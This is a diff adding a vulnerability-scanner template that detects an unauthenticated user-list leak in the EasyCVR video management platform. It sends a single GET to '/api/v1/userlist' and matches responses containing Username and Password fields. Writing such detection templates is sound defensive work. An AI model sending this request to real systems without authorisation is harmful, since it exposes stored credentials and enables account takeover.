@@ -1,0 +1,31 @@
+id: easycvr-user-info-disclosure
+brief:
+    title: EasyCVR User - Information Disclosure
+    by: dostghost
+    level: medium
+    about: The EasyCVR Video Management Platform is vulnerable to user information leakage. This template checks for exposed user information through the endpoint `/api/v1/userlist?pageindex=0&pagesize=10`.
+    label:
+        - exposure
+        - easycvr
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/api/v1/userlist?pageindex=0&pagesize=10'
+      signs:
+        - "on": word
+          has:
+            - 'Username":'
+            - 'Password":'
+            - 'count":'
+            - 'RoleName":'
+          in: body
+          need: all
+        - "on": word
+          has:
+            - application/json
+          in: content_type
+          need: all
+        - "on": status
+          status:
+            - 200
